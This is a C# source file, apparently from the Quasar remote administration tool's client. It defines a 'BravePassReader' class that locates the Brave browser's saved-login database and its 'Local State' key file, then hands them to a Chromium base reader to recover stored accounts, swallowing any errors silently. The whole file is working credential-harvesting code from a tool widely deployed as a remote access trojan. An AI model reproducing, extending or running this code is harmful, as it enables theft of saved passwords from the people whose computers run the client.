using Quasar.Common.Models;
using System;
using System.Collections.Generic;
using System.IO;

namespace Quasar.Client.Recovery.Browsers
{
    public class BravePassReader : ChromiumBase
    {
        /// <inheritdoc />
        public override string ApplicationName => "Brave";

        /// <inheritdoc />
        public override IEnumerable<RecoveredAccount> ReadAccounts()
        {
            try
            {
                string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware\\Brave-Browser\\User Data\\Default\\Login Data");
                string localStatePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
                    "BraveSoftware\\Brave-Browser\\User Data\\Local State");
                return ReadAccounts(filePath, localStatePath);
            }
            catch (Exception)
            {
                return new List<RecoveredAccount>();
            }
        }
    }
}
